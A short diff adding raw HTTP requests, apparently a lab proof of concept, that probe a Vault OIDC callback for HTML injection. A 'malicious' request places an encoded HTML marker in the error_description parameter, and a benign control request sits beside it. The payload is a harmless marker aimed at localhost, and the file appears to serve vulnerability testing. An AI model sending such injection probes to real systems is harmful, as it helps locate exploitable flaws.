@@ -1,0 +1,13 @@
+POST /v1/auth/oidc/oidc/auth_url
+Content-Type: application/json
+
+{"role":"lab-direct","redirect_uri":"http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback","client_nonce":"poc-malicious-state"}
+
+GET /v1/auth/oidc/oidc/callback?state=st_jjXjWBXjP9dokKWMIkB6&error_description=%3Cb%20data-poc%3D%22oidc-marker%22%3EOIDC_MARKER%3C%2Fb%3E
+
+POST /v1/auth/oidc/oidc/auth_url
+Content-Type: application/json
+
+{"role":"lab-direct","redirect_uri":"http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback","client_nonce":"poc-benign-state"}
+
+GET /v1/auth/oidc/oidc/callback?state=st_gGOj847eqmbF3PEytZZj&error_description=plain-control
